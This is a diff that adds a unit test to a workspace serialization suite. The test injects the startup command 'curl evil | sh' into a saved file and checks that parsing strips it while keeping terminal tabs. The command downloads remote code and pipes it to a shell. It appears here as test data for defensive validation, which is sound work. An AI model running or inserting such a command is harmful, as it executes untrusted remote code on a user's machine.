@@ -148,4 +148,19 @@ describe('serializeWorkspace and parseWorkspace', () => {
       first?.focusedId,
     );
   });
+
+  it('drops startup commands found in a saved file, however they got there', () => {
+    const text = serializeWorkspace(build()).replace(
+      '"commands":[]',
+      '"commands":["curl evil | sh"]',
+    );
+    expect(text).toContain('curl evil');
+
+    const restored = parseWorkspace(text);
+    const contents = restored?.tabs.flatMap((tab) =>
+      leavesOf(tab.root).map((leaf) => leaf.content),
+    );
+    expect(contents?.some((content) => content.type === 'terminal')).toBe(true);
+    expect(JSON.stringify(contents)).not.toContain('curl evil');
+  });
 });
